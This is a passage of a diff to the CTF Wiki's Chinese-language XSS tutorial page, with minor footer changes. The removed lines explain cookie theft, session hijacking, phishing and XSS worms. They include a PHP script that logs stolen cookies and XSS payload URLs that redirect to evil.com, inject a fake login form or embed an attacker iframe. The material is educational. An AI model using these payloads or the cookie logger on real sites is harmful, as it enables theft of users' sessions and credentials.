-  set fs=server.CreateObject(&quot;Scripting.filesystemobject&quot;)
-  set thisfile=fs.OpenTextFile(testfile,8,True,0)
-  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)
-  thisfile.close
-  set fs=nothing
-%&gt;
-</pre></div>
-</div>
-<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
-<span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cookie&#39;</span><span class="p">];</span>
-<span class="nv">$log</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;cookie.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">);</span>
-<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$log</span><span class="p">,</span> <span class="nv">$cookie</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
-<span class="nb">fclose</span><span class="p">(</span><span class="nv">$log</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="x"></span>
-</pre></div>
-</div>
-<p>攻击者在获取到 Cookies 之后，通过修改本机浏览器的 Cookies，即可登录受害者的账户。</p>
-</div>
-<div class="section" id="id5">
-<h3>会话劫持<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h3>
-<p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p>
-<p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。</p>
-<p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XMLHTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。</p>
-</div>
-<div class="section" id="id6">
-<h3>钓鱼<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h3>
-<ul class="simple">
-<li>重定向钓鱼</li>
-</ul>
-<p>把当前页面重定向到一个钓鱼页面。</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span>http://www.bug.com/index.php?search=&quot;&#39;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;
-</pre></div>
-</div>
-<ul class="simple">
-<li>HTML 注入式钓鱼</li>
-</ul>
-<p>使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span>http://www.bug.com/index.php?search=&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;
-</pre></div>
-</div>
-<p>该段代码会在正常页面中嵌入一个 Form 表单。</p>
-<ul class="simple">
-<li>iframe 钓鱼</li>
-</ul>
-<p>这种方式是通过 <code class="docutils literal"><span class="pre">&lt;iframe&gt;</span></code> 标签嵌入远程域的一个页面实施钓鱼。</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span>http://www.bug.com/index.php?search=&#39;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;
-</pre></div>
-</div>
-<ul class="simple">
-<li>Flash 钓鱼</li>
-</ul>
-<p>将构造好的 Flash 文件传入服务器，在目标网站用 <code class="docutils literal"><span class="pre">&lt;object&gt;</span></code> 或 <code class="docutils literal"><span class="pre">&lt;embed&gt;</span></code> 标签引用即可。</p>
-<ul class="simple">
-<li>高级钓鱼技术</li>
-</ul>
-<p>注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。</p>
-</div>
-<div class="section" id="id7">
-<h3>网页挂马<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h3>
-<p>一般都是通过篡改网页的方式来实现的，如在 XSS 中使用 <code class="docutils literal"><span class="pre">&lt;iframe&gt;</span></code> 标签。</p>
-</div>
-<div class="section" id="dos-ddos">
-<h3>DOS 与 DDOS<a class="headerlink" href="#dos-ddos" title="永久链接至标题">¶</a></h3>
-<p>注入恶意 JavaScript 代码，可能会引起一些拒绝服务攻击。</p>
-</div>
-<div class="section" id="id8">
-<h3>XSS 蠕虫<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h3>
-<p>通过精心构造的 XSS 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p>
-</div>
-</div>
-</div>
-
-
-           </div>
-           <div class="articleComments">
-            
-           </div>
-          </div>
-          <footer>
-  
-    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
-      
-        <a href="csrf.html" class="btn btn-neutral float-right" title="CSRF 跨站请求伪造" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
-      
-      
-        <a href="sqli.html" class="btn btn-neutral" title="SQL 注入" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
-      
+      <div class="clearer"></div>
     </div>
-  
+    <div class="relbar-bottom">
+        
+    <div class="related" role="navigation" aria-label="related navigation">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="csrf.html" title="CSRF 跨站请求伪造"
+             >next</a></li>
+        <li class="right" >
+          <a href="sqli.html" title="SQL 注入"
+             >previous</a> &nbsp; &nbsp;</li>
+    <li><a href="../index.html">CTF Wiki </a> &#187;</li>
+ 
+      </ul>
+    </div>
+    </div>
 
-  <hr/>
-
-  <div role="contentinfo">
-    <p>
-        &copy; Copyright 2017, CTF Wiki.
-
-    </p>
-  </div>
-  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
-
-</footer>
-
-        </div>
-      </div>
-
-    </section>
-
-  </div>
-  
-
-
-  
-
-    <script type="text/javascript">
-        var DOCUMENTATION_OPTIONS = {
-            URL_ROOT:'../',
-            VERSION:'',
-            COLLAPSE_INDEX:false,
-            FILE_SUFFIX:'.html',
-            HAS_SOURCE:  true,
-            SOURCELINK_SUFFIX: '.txt'
-        };
-    </script>
-      <script type="text/javascript" src="../_static/jquery.js"></script>
-      <script type="text/javascript" src="../_static/underscore.js"></script>
-      <script type="text/javascript" src="../_static/doctools.js"></script>
-      <script type="text/javascript" src="../_static/translations.js"></script>
-      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-
-  
-
-  
-  
-    <script type="text/javascript" src="../_static/js/theme.js"></script>
-  
-
-  
-  
-  <script type="text/javascript">
-      jQuery(function () {
-          SphinxRtdTheme.StickyNav.enable();
-      });
-  </script>
-   
-
-</body>
+    <div class="footer" role="contentinfo">
+        &#169; Copyright 2016-2017, CTF Wiki.
+      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.6.5.
+    </div>
+    <!-- cloud_sptheme 1.4 -->
+  </body>
 </html>
